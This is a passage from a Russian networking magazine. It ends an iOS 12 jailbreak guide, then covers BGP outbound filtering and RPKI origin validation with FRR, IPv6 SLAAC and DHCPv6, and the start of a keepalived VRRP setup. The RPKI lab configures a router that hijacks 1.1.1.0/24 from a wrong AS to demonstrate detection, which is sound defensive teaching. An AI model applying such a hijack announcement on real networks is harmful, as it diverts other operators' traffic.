9.ipa в окошко Cydia Impactor, пос ле чего вводим логин и пароль нашего
Apple ID (при включенной двухфакторной аутентифика ции — пароль приложе‐
ния) и дожидаемся, пока программа выполнит все, что нужно, с дистрибути‐
вом. В результате на экра не твоего айфона появится значок приложения
Chimera.
   Как и в предыдущем случае, нужно перейти в раздел «Настройки →
Основные → Профили и управление устройством», в разделе «ПО разработ‐
чика» нажать на строку с адресом Apple ID, а затем — на надпись «Доверять».
Вклю чаем авиарежим, запускаем на телефоне Chimera и жмем Jailbreak.
Телефон автоматически перезагрузится. После запуска iOS повторяем то же
самое до тех пор, пока на экране не появится сообщение о необходимости
перезагрузки, и нажимаем Оk.





              Джейлбрейк с использованием Chimera

Результатом всех этих действий должно стать появление на экране iPhone
значка Sileo. Это еще одно приложение для работы со сторонними репози‐
ториями iOS, по своим функциям и воз можнос тям в целом аналогичное Cydia.





                      Джейлбрейк удался!

Чтобы добавить в прог рамму новые репозитории, нажми на кнопку Sources
в нижней части окна Sileo, затем на кнопку + справа вверху и в открывшемся
поле введи адрес источника приложений. Поиск и установка программ
выпол няется в точности так же, как и в Cydia, — при помощи кнопки с изоб‐
ражением лупы в правом нижнем углу.


             INFO

                    Оба описанных в статье способа джейла работа‐
                     ют только до перезагрузки девайса. После каж‐
                       дого включения питания нужно заново запускать
                       на  устройстве  установленную  тобой  утилиту
                         (unc0ver или  Chimera) и нажимать на кноп ку
                            Jailbreak.



ВЫВОДЫ
Как видишь, в джейлбрейке iOS 12 нет решительно ничего сложного — если
тщательно следовать инструкции. Различные  источники предупреждают
об опасности этой процеду ры, но, как показывает мой личный опыт, эта опас‐
ность несколько преувеличена. Зато джей лбрейк откры вает перед владель‐
цем девайса настоящую сво боду в настройке ОС и установке всевоз можного
софта, а ведь именно это зачастую и требуется бесстрашному исследова‐
телю!
АДМИН
 PREFIX
  HIJACKING





         ИСПОЛЬЗУЕМ RPKI
           ДЛЯ БОРЬБЫ
        С ПОТЕРЕЙ ТРАФИКА





Инциденты  с  preﬁx  hijacking  случаются
регулярно, когда тра фик массово отправ‐
ляется не тем  путем, которым должен.
Некоторые  из  них,  может,  и  связаны
со злым умыс лом, но большинство случай‐         Даниил Батурин                                                                                   Координатор проекта VyOS
ны и происходят по вине нев нимательных        (https://vyos.io),функциональщик,«языковед»,иногда
админов. Сегодня я расскажу, как провай‐         сетевойdaniil@baturin.orgадминистратор
деры могут предотвра тить их или свести
к минимуму, а заодно и как самому не стать
их виновником.


             INFO

                   В примерах настро ек я использую стек протоко‐
                       лов   FreeRangeRouting.  Пользователям  BIRD
                      или OpenBGPD придется действовать по ана‐
                         логии.
                    В этой статье предполагается, что у тебя уже
                         есть опыт работы с FRR, Quagga или Cisco IOS
                      и базовые знания о  Border Gateway  Protocol
                        (BGP).



СУТЬ ПРОБЛЕМЫ
Протокол маршрутизации BGP сам по себе не содержит никакой информа‐
ции о том, кому принадлежит та или иная сеть. Анонсировать чужие префиксы
при этом вполне обычная практика — небольшие сети анонсируют свои сети
транзитным провайдерам с раз витой сетью, а те уже анонсируют их всем
остальным. Кроме того, на точках обмена тра фиком активно используются
так называемые сервера маршру тов  (route  servers), которые позволяют
получать маршруты ко всем сетям учас тни ков точки сразу, без настройки
отдельной сессии с каждым из них.
  BGP намеренно спро ектирован  так, чтобы можно было фильтровать
и модифицировать маршру ты произвольным обра зом без нарушения работы
самого протокола. OSPF, к примеру, принципиально не поз воляет даже
фильтровать входящие маршруты: поскольку каждый маршрутизатор OSPF
строит и поддерживает полную карту соединений в сети, отказ одного мар‐
шрутизатора запоминать часть сети может нарушить ее связь со всеми
остальными. Протоко лы с отслежива нием состояния каналов (link‐state) вро‐
де OSPF прекрасно подходят для внут ренней маршрутизации, где на выбор
пути влияют только технические соображения: длина пути и его пропускная
способность.
  Поскольку интернет — объединение независимых сетей, в силу вступают
экономические и политические факторы. Самый короткий путь не всегда
самый выгодный. Из‐за это го реализации BGP вынужденно поз воляют такие
виды фильтрации и модификации анонсов, которые неприемлемы в других
протоколах.
  Отсутствие аутентифика ции открывает большой простор для случайных
ошибок и намеренных зло употреблений. Давай разбираться, как их избе жать.


ФИЛЬТРАЦИЯ ИСХОДЯЩИХ АНОНСОВ
Прежде чем рассматривать механизмы защиты от чужих ошибок, давай рас‐
смотрим, как не стать виновником инци дента самому.
   Случайная утечка одного префикса встречает ся крайне редко, в боль‐
шинстве случаев утекает вся таблица маршру тов. Эта ситуация весьма
неприятна для всех учас тников. Инициатор ненамеренно становится тран‐
зитным провайдером для жертв и берет на себя расходы по передаче их тра‐
фика. Если сеть не готова к возросшей нагрузке, такой инцидент способен
положить и сеть инициатора, и сети жертв.
  Неопытные админы, которые до этого работа ли с единс твенным подклю‐
чением к провайдеру, час то забыва ют про филь тры.
  Предположим, есть вот такой конфиг:


router bgp 64496
  network 192.0.2.0/24


  neighbor 203.0.113.10 remote‐as 64500
  neighbor 203.0.113.10 description AwfulTransit

Диапазон  номеров  авто номных  систем  64496–64511  зарезервирован
для примеров и документации в RFC5398. Он не совпадает с диапазоном
для частного использования (64512–65534). Разница такая же, как между
диапазоном  адресов  IPv4  для  частного  использования  из  RFC1918
и сетями 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24 (TEST‐NET‐[123]).
  Сети и номера AS из частных диапа зонов выделены для того, чтобы внут‐
ренние ресурсы организа ций не конфликтовали в публичном интернете,
а зарезервированные для документации — чтобы без думное при менение
примеров из статей не конфликтовало с реальными сетями.
  Мы анонсируем провайдеру сеть 192.0.2.0/24. Провай дер анонсирует нам
все маршруты интернета. В этой ситуации никакие фильтры не нужны, потому
что ни один протокол маршру тиза ции не анонсирует полученные от соседа
маршруты обратно ему же. Это базовый механизм пре дотвращения петель
маршрутизации.
  В то же время все про токолы, вклю чая BGP, анонсируют все маршруты
всем остальным соседям, если не указано обратное. Чем больше связность
сети и число альтернативных маршрутов к каждой сети, тем она надежнее.
Если, конечно, все участники могут и согласны пропускать через себя этот
трафик — а клиенты провайдеров не готовы и не согласны.
  Предположим, что ты добавил подключение ко второму провайдеру:


router bgp 64496
  neighbor 203.0.113.20 remote‐as 64510

С такими настройками твой маршрутиза тор начнет анонсировать маршру ты
одного провайдера другому.
   Чтобы этого не произош ло, нужно явно ука зать, что анонсировать.
   Если у тебя всего один маршру тиза тор BGP и все маршруты приходят
из какого‐то внутреннего про токола или опций network, проще всего отфиль‐
тровать по пустому AS path. Номер автономной сис темы добавляется в путь
маршрута не в момент его зарождения, а в момент анонса, поэтому у локаль‐
но порожденных маршрутов он пус той. Пустой строке соответствует регуляр‐
ное выражение ^$.


bgp as‐path access‐list LocalOnly permit ^$
!
route‐map LocalOnly permit 10
 match as‐path LocalOnly
!

Если у тебя есть свои клиенты или маршруты по иной при чине приходят опять
же из BGP, то придется филь тровать явно, с помощью prefix‐list.
  На практике в случае с клиентом и провайдером при утечке таб лицы про‐
вайдер автоматически отключит сессию клиента или проигнориру ет лишние
маршруты. Успешный захват префиксов обычно происходит между рав‐
ноправными сетями: транзитными про вай дерами или учас тниками точки
обмена трафиков.
   Как провайдеры это предот вра щают? Самая простая и неспецифичная
мера защиты — опция maximum‐prefix.


ОПЦИЯ MAXIMUM-PREFIX
Эта опция делает ровно то, о чем говорит ее название. Если количес тво
сетей в анонсе соседа превышает указанное значение, сессия автоматичес‐
ки обрывается и соседу отправляет ся BGP notiﬁcation.
  В FRR это делается вот так:


router bgp 64500
  address‐family ipv4 unicast
    neighbor 192.0.2.10 maximum‐prefix 1

Очевидный недостаток: нарушение политики со сто роны клиента обрывает
всю связь с провайдером. Добавление новой сети или разделение существу‐
ющей на части становится для клиента весьма рис кованной операцией,
для которой нужно уведомить провайдера и дождаться его подтверждения
перед тем, как менять нас тройки.


АЛЬТЕРНАТИВЫ
Увы, все альтернативы в рамках самого BGP — либо немас штабируемые,
либо чисто эвристические.
  Очевидный вариант, подходящий для провайдеров и клиентов — явный
список разрешенных префиксов. В этом случае клиенту также нужно уведом‐
лять провайдера каждый раз при появлении новой сети, но новые префиксы
не обрушат внезапно всю сессию — и можно раз решить не точное сов‐
падение, а сеть со всеми ее подсетями. Нап ример, разрешим принимать
от клиента сети 192.0.2.0/24 и 203.0.113.0/24 вмес те со все ми их под сетями
вплоть до /32:


!
ip prefix‐list MyPrefixes seq 10 permit 192.0.2.0/24 le 32
ip prefix‐list MyPrefixes seq 20 permit 203.0.113.0/24 le 32
!
route‐map Transit‐Out permit 10
 match ip address prefix‐list MyPrefixes
!
router bgp 64500
 neighbor 198.51.100.1 remote‐as 64501
 !
 address‐family ipv4 unicast
  neighbor 198.51.100.1 route‐map Transit‐Out out
 exit‐address‐family
!

Другой вариант — фильтрация по максимальной длине AS path. По аналогии
с пустым путем локальных маршрутов из фильтра для исходяще го направле‐
ния мы можем разрешить на сто роне про вай дера все маршру ты, у которых
путь состоит из ровно одной AS, — с помощью регулярного выражения ^([0‐
9]+)(_\1)*$. Это автоматичес ки исключит маршруты, которые пришли
к нашему соседу извне, а не были порож дены им самим. Очевидно,
это защитит только от случайных ошибок, а не намеренных попыток анон‐
сировать чужую сеть.
  Почему не [0‐9]+? Многие люди для кон троля за тем, через какого про‐
вайдера  к ним пой дет вхо дящий трафик, исполь зуют опцию AS  path
prepend, которая искусс твенно делает путь длиннее, чем он есть, поскольку
добавляет в него локаль ную автономную систему нес колько раз. Выраже ние,
которое соответствует пути из ровно одно го номера AS, запретило бы такие
анонсы.
  Ни один из этих вариантов не подходит для пиринга между провайдерами
или  участниками  точек обмена  тра фиком. Знать содержимое анонсов
наперед в этих случаях невозможно, нуж но проверять именно аутентичность
анонсов.
  Сам BGP исполь зуется еще с девяностых, но механизм для проверки
аутентичности анонсов появился недавно и называ ется Resource Public Key
Infrastructure (RPKI).


RPKI
RPKI — сравнительно новый механизм, который поз воляет автоматически
проверять принадлежность префиксов к автономным сис темам.
   RPKI не является частью BGP и не огра ничивает ся им. По сути, это экви‐
валент whois с цифровыми подписями и набором протоколов для их авто‐
матической проверки. Подписывать сами анонсы было бы бессмыс ленно,
поскольку их модификация при передаче неизбежна — каждый маршрутиза‐
тор должен добавить в AS path свой номер авто номной сис темы. Вместо это‐
го BGP origin validation проверяет соот ветс твие адреса сети и автономной
системы источника — крайнего правого номера в AS path.
  К сожалению, RPKI — не нас тоящее, а будущее. Еще далеко не все опе‐
раторы автономных систем участвуют в ней, нес мотря на очевидные преиму‐
щества, поэтому просто отфиль тровать все анонсы, для которых нет данных
валидации, не выйдет. Можно только отфильтровать явно не соответству‐
ющие автономной сис теме источника. Тем не менее ознакомиться с ней
и увидеть ее в работе сейчас может каждый.
   Хранение базы данных соответствия сетей и автономных систем и провер‐
ка подписей про изводят ся не на самом маршрутизаторе, а на отдельном
сервере — для экономии ресурсов.


Запускаем сервер RPKI
Для демонстрации потребуется хост для сервера RPKI с любой UNIX‐подоб‐
ной системой, программы rsync и JDK8+ и два хоста с установленным FRR.
  Прежде чем настраивать что‐то в FRR, нуж но запустить сам сервер RPKI.
Мы будем использовать реализацию RIPE, которая состоит из двух компонен‐
тов: rpki‐validator‐3 и rpki‐rtr‐server.


Запускаем rpki-validator
Сначала нужно  запустить  rpki‐validator‐3. Он дос тупен  в виде образа
для Docker и пакетов RPM для CentOS 7, а также в виде обычного tgz‐архива
с исполняемым файлом, который запускается на любой сис теме.


$ wget https://ftp.ripe.net/tools/rpki/validator3/prod/generic/
rpki‐validator‐3‐latest‐dist.tar.gz
$ tar xfz ./rpki‐validator‐3‐latest‐dist.tar.gz
$ cd rpki‐validator‐<номер версии>
$ ./rpki‐validator‐3.sh

Настройки для баз данных всех RIR (RIPE, ARIN и дру гих) уже включены в ком‐
плект, он автоматически загрузит их базы данных. Для его работы требуются
только JDK8 или новее и rsync. Объем скачива емых данных пока в пределах
гигабайта.
   Если ты планируешь запус кать оба сервиса на одной машине, допол‐
нительная настройка не требуется. Если нет, нужно поправить опцию server.
address в conf/application.properties: по умолчанию он слушает только
на localhost.


Запускаем rpki-rtr-server
Сам протокол RTR реализует другой проект: rtr‐server. Для своей работы он
требует запущенного  rpki‐validator, поэтому предыду щий шаг пропус тить
нельзя. Если он не сможет подключиться к валидатору, он сообщит об этом
исключением вида I/O error on GET request for "http://localhost:
8080/api/objects/validated": Connection refused  (Connection  re‐
fused).
  Процедура его запуска столь же проста:


$ wget https://ftp.ripe.net/tools/rpki/validator3/prod/generic/
rpki‐rtr‐server‐latest‐dist.tar.gz
$ tar xfz ./rpki‐rtr‐server‐latest‐dist.tar.gz
$ cd rpki‐rtr‐server‐<номер версии>
$ ./rpki‐rtr‐server.sh

Он тоже по умолчанию слушает только на localhost. Если нас траивать FRR
с проверкой аутентичнос ти анонсов ты будешь на другой машине, нужно поп‐
равить опцию rtr.server.address в conf/application.properties.
  После того как оба сервиса успешно запустятся, можно настроить сам
FRR.


Настраиваем FRR
Клиент RPKI реализован в биб лиотеке rtrlib. RTR здесь — RPKI to Router proto‐
col, протокол обмена данными между сервером RPKI и маршру тизатором.
Большинство сво бодных реализаций BGP, вклю чая FRR, используют именно
ее.
  По умолчанию RPKI в BGPD выключен, и чтобы его включить, нужно
поправить /etc/frr/daemons:


bgpd_options="   ‐‐daemon ‐A 127.0.0.1 ‐M rpki"

Сначала нас троим маршрутизатор условного провай дера. Предположим, что
rtr‐server запущен на 192.168.56.1. Зайдем в vtysh и добавим следующие нас‐
тройки:


rpki
  rpki polling_period 1000
  rpki timeout 10
  rpki initial‐synchronisation‐timeout 30
  rpki cache 192.168.56.1 8323 preference 1

Проверить статус можно командой show rpki cache‐connection. Если все
прошло нормально, вывод будет выглядеть так:


Connected to group 1
rpki tcp cache 192.168.56.1 8323 pref 1

Теперь настроим сам BGP. В route‐map для не соответствующих автономной
системе пре фиксов мы понизим local  preference до 5 (ее значение
по умолчанию — 100), чтобы эффект мож но было увидеть в show ip bgp:


router bgp 64496
 neighbor 192.0.2.10 remote‐as 64501
 !
 address‐family ipv4 unicast
  neighbor 10.46.1.100 route‐map RPKI‐Test in
 exit‐address‐family
!
route‐map RPKI‐Test permit 10
 match rpki invalid
 set local‐preference 5

Теперь настроим маршру тиза тор условного злоумышленни ка, который будет
анонсировать сеть сервера DNS Cloudﬂare (1.1.1.0/24, AS13335) из явно
несоответствующей автономной системы 64501:


ip route 1.1.1.0/24 blackhole


router bgp 64501
 neighbor 192.0.2.1 remote‐as 64496
 !
 address‐family ipv4 unicast
  network 1.1.1.0/24
 exit‐address‐family

Теперь на первом маршру тизаторе в show ip bgp мы увидим следующую
картину:



  Network          Next Hop            Metric LocPrf Weight Path
  *> 1.1.1.0/24    192.0.2.10          0      5      0      64501 i



ЗАКЛЮЧЕНИЕ
Надеюсь, эта статья поможет тебе дожить до массового внед рения RPKI
без инцидентов.


        WWW

                     Рекомендую почитать докумен тацию FRR по RPKI
                      и RIPE NCC.
АДМИН
  НЕПРОСТОЙ
  ПРОТОКОЛ

     АВТОМАТИЗИРУЕМ НАСТРОЙКУ
          АДРЕСОВ В IPV6





IPv6 печально знаменит своей сложностью,
во многом — оправданно. Вза мен нас‐
ледия  IPv4 появились новые кон цепции
и варианты нас тройки. Авторы стека про‐
токолов IPv6 хотели сделать его более дру‐         Даниил Батурин                                                                                   Координатор проекта VyOS
жественным  к  конечным  пользователям        (https://vyos.io),функциональщик,«языковед»,иногда
и самонастраивающимся сетям. Увы, прос‐         сетевойdaniil@baturin.orgадминистратор
тота для пользователя нередко обо рачи‐
вается сложностями для админа.


В IPv4 есть всего два варианта: статическая нас тройка адреса и шлюза
по умол чанию или DHCP. Сегодня мы рассмотрим в деталях, что же пришло
на смену классическому DHCP из IPv4, как оно работает и как с этим жить.
  Нужно помнить, что в IPv6 наконец исчез целый ряд устаревших тех‐
нологий. В частности, в нем больше нет широковещательной рассылки
(broadcast), во всех протоколах ее заменила многоадресная рассылка (multi‐
cast) и стандартизованные групповые адреса: например, ﬀ02::1 — все хос ты
в сегменте, ﬀ02::2 — все маршру тизаторы.
  Кроме того, не все механизмы автомати чес кой нас тройки тре буют учас тия
сервера или маршрутизатора.


АДРЕСА LINK-LOCAL
Начнем с концепции адресов типа  link‐local. Они выделяются из сети
ﬀ00::/8 и присваиваются каждой сетевой карте при загрузке системы. В отли‐
чие от IPv4, в IPv6 их использование обязатель но. Это позволяет каждому
устройству иметь адрес и взаимо действовать с другими устройствами той же
сети, независимо от того, успешно ли отработали другие механиз мы нас‐
тройки и вклю чены ли они вообще.
  Для рассылки пакетов через multicast нужен адрес источника, а broadcast
в IPv6, как мы помним, нет. Именно поэтому наличие адреса на самом раннем
этапе загрузки особенно важно. В IPv4 с его массовым применением
широковещательной  рас сылки   эту  проб лему   «решали»,  используя
адрес 0.0.0.0 вместо адреса источника или наз начения.
  Изолированная сеть теоретичес ки может работать на одних адресах link‐
local, с точки зрения хостов они неот личимы от любых дру гих. Различие
существует только для маршру тиза торов, которые по стандарту обязаны
не пересылать пакеты с link‐local в адресе назначения в другие сети.
  На практике, конечно, от сети мало пользы без соединения с интернетом
или другими частными сетями, поэто му перейдем к механизмам нас тройки
публичных адре сов.
   Эта  идея  не  нова:  в  IPv4  они  уже  сущес твовали  и  выделялись
из сети 169.254.0.0/16, но широко го рас пространения не приобрели. Одна
из причин этого — сложно предотвра тить конфликты адресов. Успешная
реализация этой идеи требует дос таточно надежных и практичных способов
обеспечить адресам хос тов уникальность. Пос мотрим, как эта проблема
решается в IPv6.


УНИКАЛЬНЫЕ АДРЕСА ХОСТОВ
Стандартный размер сети для одного сегмента канального уровня в IPv6 —
                           64/64. Это очень много — 2  адресов! Казалось бы, абсурдная идея, но для
нее есть основания. В 64 бита можно помес тить существующий глобально
уникальный идентифика тор или сгенери ровать слу чайный с очень низкой
вероятностью кон фликтов.
  Каждый заводской MAC‐адрес гарантированно уни кален, поэтому можно
избежать потенциальных конфликтов адресов навсегда, просто использовав
MAC‐адрес сетевой карты как часть ее адреса IPv6. Этот механизм называ‐
ется EUI‐64 (Extended Unique Identiﬁer). В деталях про него можно прочитать
в приложении к RFC 2373.
   Размер MAC‐адреса — 48 бит (шесть байт), а нам нужно 64, поэтому он
делится на две части по три байта и в середи ну вставляется магическое чис‐
ло 0xFFFE. Кроме того, инвертируется седь мой бит MAC‐адре са — у глобаль‐
но уникальных он по умолчанию установлен в ноль.
  Поскольку адреса типа link‐local не маршру тизируются, никаких проб лем
с приватностью такой подход не создает. Для прис воения публичных адресов
он, очевидно, проб лематичен — зло умышленник с доступом к дампам тра‐
фика или логам сервера лег ко может отождес твить адреса из раз ных сетей —
например, из дома, с работы или публичной точки доступа Wi‐Fi в гос‐
тинице — с одним устройством и отследить перемещения пользователя.
  В современном мире это далеко не самая боль шая угроза приватности,
так что мы не будем рассматривать механизмы борьбы с ней в деталях,
но они существуют. Один вариант, IPv6 privacy extensions, описан в RFC 3041.
Важнее то, что в IPv6, вернее в NDP — эквивалент ARP, встроен механизм
выявления коллизий адресов. Узлы сначала присваивают адресу состояние
tentative и ждут, не придет ли пакет NDP с этим адре сом в источнике. Если
такой пакет приходит, адрес не активиру ется.
   Таким образом, идея автоматически сгенери рованных адресов примени‐
ма и к локальным адресам, и к пуб личным. Для настройки нужен только адрес
сети.
  Маршрутизаторы при настройке сетевых карт нередко позволя ют указать
вручную только адрес сети, но оста вить систему генери ровать идентифика‐
тор хоста самостоятельно: например, interface Gi0; ipv6 address 2001:
db8::/64 eui‐64 в Cisco IOS, set interfaces ethernet eth0 ipv6 ad‐
dress eui64 2001:db8::/64 в VyOS. Хосты адрес своей сети обычно не зна‐
ют, поэтому его нужно получить из внеш него источника. Тут и вступает в дей‐
ствие SLAAC (StateLess Address AutoConﬁguration) через router advertisement.


ROUTER ADVERTISEMENT (SLAAC)
Нужно помнить, что ARP в IPv6 тоже нет, его роль взял на себя NDP — Neigh‐
bor Discovery Protocol, описанный в RFC 4861. В отличие от ARP, это не
отдельный протокол промежу точного уровня меж ду сетевыми и канальным,
а подмножество ICMPv6. Это стало возможно именно потому, что адреса link‐
local обязательны: в сети не может быть хос тов с неопределенным адресом.
  Он заметно функциональнее своего предшественника, и в чис ле прочего
в нем есть явное разделение между ролями хос та и маршрутизатора.
В  IPv4 адрес маршру тиза тора можно было  толь ко нас троить  вручную
или получить через DHCP, в IPv6 же маршру тиза торы рас сылают пакеты
с информацией о том, что они готовы маршру тизировать трафик хос тов,
и заодно сообщают им свой адрес.
   Этот же протокол способен передать хостам адрес сети, в которой они
оказались, чтобы они смогли сами нас троить себе адреса.
  Попробуем настроить этот механизм на GNU/Linux. Для рассылки router
advertisement будем использовать пакет radvd. Он обычно присутству ет
в репозиториях, и сложностей с его установкой возникнуть не должно.
  Предположим,     что    на     eth0    маршрутизатора    настроен
адрес  2001:db8::1/64. Для начала включим маршрутизацию  IPv6: sudo
sysctl ‐w net.ipv6.conf.all.forwarding=1. Затем напишем следующее
в /etc/radvd.conf:


interface eth0 {
    IgnoreIfMissing on;
    AdvManagedFlag off;
    AdvReachableTime 0;
    AdvSendAdvert on;
    AdvOtherConfigFlag off;
    prefix 2001:db8::/64 {
        AdvOnLink on;
        AdvAutonomous on;
    };
};

После запуска в radvd мы увидим в дампе тра фика следующую картину:



  11:36:49.958369 IP6 (flowlabel 0xf840b, hlim 255, next‐header ICMPv6
  (58) payload length: 56) fe80::a00:27ff:fe76:3417 > ff02::1: [icmp6 sum
  ok] ICMP6, router advertisement, length 56
  hop limit 64, Flags [none], pref medium, router lifetime 1800s, reach‐
  able time 0s, retrans time 0s
    prefix info option (3), length 32 (4): 2001:db8::/64, Flags [onlink,
  auto], valid time 86400s, pref. time 14400s
    source link‐address option (1), length 8 (1): 08:00:27:76:34:17


Это и есть router advertisement. Адрес назначения ﬀ02::1 — групповой адрес
всех хостов. Обрати внимание: в качестве адреса источника используется
адрес link‐local, а не глобальный публичный адрес.
   Если в качестве клиентско го хоста Linux, то вручную автонас тройку можно
вклю чить с помощью опции sudo sysctl ‐w net.ipv6.conf.eth0.accep‐
t_ra=1,  хотя проще сделать  это  через  NetworkManager. После  этого
на интерфейсе ты увидишь автоматичес ки настроенный адрес, а в ip ‐6
route — запись вида default via fe80::a00:27ff:fe76:3417. Все авто‐
матически настроенные маршру ты в IPv6 исполь зуют именно адрес link‐local
в качестве адре са шлюза, как на хостах, так и на маршру тизаторах с RIPng,
OSPFv3, а нередко и с BGP.
  Через router advertisement можно раз давать толь ко маршруты и адре са
сетей. Есть расширения для раз дачи адресов серверов DNS, но для раздачи
дополнительной информации вроде серверов NTP или вовсе произвольных
опций без DHCPv6 не обойтись.


DHCPV6
DHCPv6 похож на своего предшественника из IPv4, но отличается деталями
реализации, и про эти раз личия нужно помнить, что бы правильно его нас тро‐
ить.
  Поскольку настрой ка маршру та по умолчанию в IPv6 делается автомати‐
чески через router advertisement, в DHCPv6 эта воз можность не предусмотре‐
на — не ищи ее в документации.
  В IPv4 хосты рассыла ют широко вещательный запрос к серверу DHCP.
В  IPv6, даже когда хост нас троен использовать DHCPv6, он не станет
это делать, если маршру тиза тор не ска жет ему о присутствии в сети сервера.


Настраиваем RA для DHCPv6
В нашем radvd.conf была опция AdvAutonomous on. Согласно RFC 4862,
флаг autonomous означает, что никакой другой механизм раздачи настроек
в сети не предусмотрен и хостам следует настра ивать свои адре са на основе
информации об адресе сети из пакета: 2001:db8::/64 в нашем случае. Если
этот флаг выставлен в ноль, то хос ты игнорируют информацию об адресе
сети из пакетов router advertisement.
  Должны ли хосты отправлять запрос к серверу DHCPv6, опре деляют флаги
Managed и OtherConﬁg. Флаг Managed означает, что хосты должны получить
адреса через DHCPv6. Флаг OtherConﬁg означает, что хосты должны исполь‐
зовать SLAAC, но через DHCPv6 доступны допол нительные настройки.
  Поэтому, прежде чем нас тра ивать сервер DHCPv6, нужно снова поправить
/etc/radvd.conf и прописать там AdvManagedFlag  on и AdvAutonomous
off, затем перезапустить сервис.


Настраиваем DHCPv6
Сервер DHCPv6 можно найти в пакете ISC DHCP, в разных дистрибути вах он
называется или dhcp‐server, или isc‐dhcp‐server. Расположение конфига
дистрибутиво‐зависимо и настра ивает ся в опциях запуска, условно будем
считать, что он лежит в /etc/dhcpd/dhcpd6.conf. Напишем туда для теста
минимальный конфиг:


shared‐network TEST {
    subnet6 2001:db8::/64 {
        range6 2001:db8::1000 2001:db8::2000;
        option dhcp6.name‐servers 2001:db8::100;
    }
}

Теперь осталось запустить сервис, настроить на клиенте опцию получать нас‐
тройки из DHCPv6 и посмотреть, что будет.


ЗАКЛЮЧЕНИЕ
В корпоративных сетях IPv6 все еще ско рее исклю чение, чем правило, но,
когда он туда доберется, эта статья, я надеюсь, поможет тебе быть к этому
готовым.
АДМИН

СТОЙКИЙ АДМИН





     СТРОИМ ОТКАЗОУСТОЙЧИВЫЕ
       СЕТИ В LINUX С KEEPALIVED




 VRRP,  несмотря  на  неясную  ситуацию
 с патентами Cisco, оста ется стандартным
 протоколом для горячего резервирова ния
 маршрутизаторов. Популярный в системах
 семейства BSD протокол CARP свободен         Даниил Батурин                                                                                    Координатор проекта VyOS
 от патентных ограничений, но статус стан‐        (https://vyos.io),функциональщик,«языковед»,иногда
 дарта и поддержка со стороны многих пос‐         сетевойdaniil@baturin.orgадминистратор
 тавщиков имеют свои преимущества —
 есть по крайней мере теоретическая воз‐
 можность сменить поставщика незаметно
 для пользователей сети. Мы рассмотрим,
 как настроить отка зоустойчивый маршру‐
 тизатор на основе Linux. В качестве реали‐
 зации  VRRP  мы  будем  использовать
 keepalived.


 ПРОТОКОЛ VRRP
 VRRP расшифровывается как  Virtual Redundancy Router Protocol. Группа
 физических маршрутиза торов объединяется в один виртуальный. Каждый
 участник группы может находиться в трех состояниях: неопределенном (initial‐
 ize), основном (master) и резервном (backup). У всех участни ков в настройках
 присутствует один или нес колько виртуальных адресов. У основного эти
 адреса присвоены сетевой карте, а у остальных — просто ждут своего часа.
   Прежде всего нужно ска зать, что VRRP работает поверх IP, а не напрямую
 поверх канального уровня. Если быть точным, он использует групповой (multi‐
 cast) адрес 224.0.0.18. Поскольку multicast по умол чанию не маршрутизирует‐
 ся, взаимодействие возможно только в пределах одной физической сети.
   Это значит, что, помимо общего вир туального адреса, каждому маршру‐
 тизатору на каждом сетевом интерфей се, где ты нас траиваешь VRRP, дол жен
 быть присвоен основной, с которого он будет отправлять соседям слу жебные
 пакеты.
   Нужно сразу сказать, что основной (служеб ный) адрес совсем не обязан
 быть из одной сети с вир туальными. Если у тебя недостаточно публичных
 адресов для тех сетевых карт, которые смотрят в интернет, ты впол не можешь
 использовать частные адреса из RFC 1918 в качестве служебных. Ну, если
 настройки твоего провайдера это го не зап рещают.
   У каждой группы маршрутизаторов есть VRID — Virtual Router Identiﬁer.
 Это просто число в диапазоне от 1 до 255. С каждой группой может быть
 ассоциирован один или несколько вир туальных адресов. На уровне протоко‐
 ла список адре сов передается, но только для отладочных целей. Процесс
 VRRP их никак не исполь зует, тем более что переда ются они без маски под‐
 сети, так что за идентичностью настроек вир туальных адре сов нужно следить
 самому.
   Группы с разным VRID друг с другом не вза имодействуют, поэтому в одной
 физической сети может быть нес колько незави симых групп резервирования,
 главное — настроить.
   При загрузке или первичной нас тройке VRRP участники группы оказыва‐
 ются  в  неопределен ном  сос тоянии  (initialize)  и выбирают,  кому  быть
 основным, а кому резервным. В настройках VRRP можно указать приоритет
 (priority) — маршрутизатор с наибольшим при оритетом выигрывает выборы.
   Если приоритет у нескольких маршрутизаторов одинаковый, выигрывает
 тот, у кого самый большой адрес IP. Я сам ста раюсь не полагаться на случай
 и всегда указываю приоритет явно.
   Маршрутизатор, который выбрали основным, прис ваивает своей сетевой
 карте виртуальные адреса и начина ет рас сылать остальным пакеты VRRP ad‐
 vertisement. Таким способом он сообщает, что еще жив и работос пособен.
   Пока эти пакеты приходят, резервные маршрутиза торы ничего не делают.
 Когда основной упадет и резервные заметят, что пакеты перестали при‐
 ходить,  они  инициируют выборы  заново  и  выберут  новый  основной
 из оставшихся, по тем же правилам.
   Что будет, если бывший основной маршру тиза тор вернется к жизни? Все
 зависит от опции preempt в нас трой ках. Если она включена, то он снова ини‐
 циирует выборы и вер нет себе былую славу. Если нет, так и останется резер‐
 вным.
   Вклю чать или не вклю чать preempt — дело вку са. С одной стороны, с этой
 опцией легко предсказать, какой маршрутизатор в данный момент основной,
 а с другой — переключений сос тояния, а значит, и потерянных пакетов будет
 больше. Я обычно вклю чаю, но свое мнение никому не навязываю.


 НАСТРАИВАЕМ KEEPALIVED
 Перейдем от теории к практике. В пер вую очередь нам потребуется пакет
 keepalived. Его функциональность шире, но сегодня мы сосредоточимся
 именно на VRRP. Этот пакет есть в репозиториях у всех популярных дистри‐
 бутивов, так что с его уста новкой сложностей быть не дол жно.
   Сценарий будет такой: два маршру тиза тора, rtr‐master со служебным
 адресом 192.0.2.1 и rtr‐backup с адресом 192.0.2.2. В качестве виртуального
 адреса возьмем 192.0.2.254, а VRID уста новим в 10. Будем считать, что слу‐
 жебные адреса настроены на сетевом интерфейсе eth0.
   Файл настро ек лежит в /etc/keepalived/keepalived.conf. Начнем
 с резервного маршрутиза тора, чтобы было проще увидеть, как его роль возь‐
 мет на себя основной. Присвоим ему приоритет, равный 100.


 rtr‐backup$ cat /etc/keepalived/keepalive.conf


 vrrp_instance my‐group {
   state BACKUP
   interface eth0
   virtual_router_id 10
   priority 100
   advert_int 1


   preempt_delay 0
   virtual_ipaddress {
     192.0.2.254/24
   }
 }

 Запустим сервис  с помощью  systemctl  start  keepalived.service
 или эквивалента для систем без systemd. В выводе ip address show мы
 сможем увидеть, что он присвоил eth0 адрес 192.0.2.254.
   Теперь создадим идентичный конфиг на rtr‐master, но с опцией priority
 200. Для наглядности запустим на rtr‐master дамп трафика, например sudo
